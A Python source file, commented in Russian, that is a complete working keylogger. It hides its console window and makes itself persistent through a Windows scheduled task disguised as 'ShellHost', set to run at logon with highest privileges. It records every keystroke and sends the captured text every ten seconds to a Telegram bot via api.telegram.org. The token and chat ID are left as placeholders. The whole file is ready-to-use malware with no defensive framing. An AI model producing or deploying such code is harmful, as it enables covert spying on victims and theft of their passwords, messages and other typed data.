import keyboard
import threading
import requests
import ctypes
import os
import sys
import subprocess

# === Telegram настройки ===
BOT_TOKEN = 'ВАШ_ТОКЕН'
CHAT_ID = 'ВАШ_CHAT_ID'
SEND_INTERVAL = 10  # интервал в секундах

log_data = ""

# === Скрытие окна консоли ===
def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass

# === Автозагрузка через Task Scheduler ===
def add_to_startup():
    try:
        file_path = os.path.realpath(sys.argv[0])
        task_name = "ShellHost"

        cmd = [
            "schtasks", "/Create", "/SC", "ONLOGON",
            "/RL", "HIGHEST",
            "/TN", task_name,
            "/TR", f'"{file_path}"',
            "/F"
        ]

        subprocess.run(" ".join(cmd), shell=True)
    except Exception as e:
        with open("error.log", "a", encoding="utf-8") as f:
            f.write("Autostart error: " + str(e) + "\n")

# === Отправка данных в Telegram ===
def send_log():
    global log_data
    try:
        if log_data.strip() != "":
            chunks = [log_data[i:i+4000] for i in range(0, len(log_data), 4000)]
            for chunk in chunks:
                requests.post(
                    f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                    data={'chat_id': CHAT_ID, 'text': chunk},
                    timeout=5
                )
            log_data = ""
    except Exception as e:
        with open("error.log", "a", encoding="utf-8") as f:
            f.write("Send error: " + str(e) + "\n")

    threading.Timer(SEND_INTERVAL, send_log).start()

# === Обработка клавиш ===
def on_key(event):
    global log_data
    try:
        name = event.name
        if name == 'space':
            log_data += ' '
        elif name == 'enter':
            log_data += '\n'
        elif name == 'backspace':
            log_data = log_data[:-1]
        elif len(name) == 1 and name.isprintable():
            log_data += name
    except:
        pass

# === Точка входа ===
if __name__ == "__main__":
    hide_console()
    add_to_startup()
    send_log()
    keyboard.on_press(on_key)
    keyboard.wait()
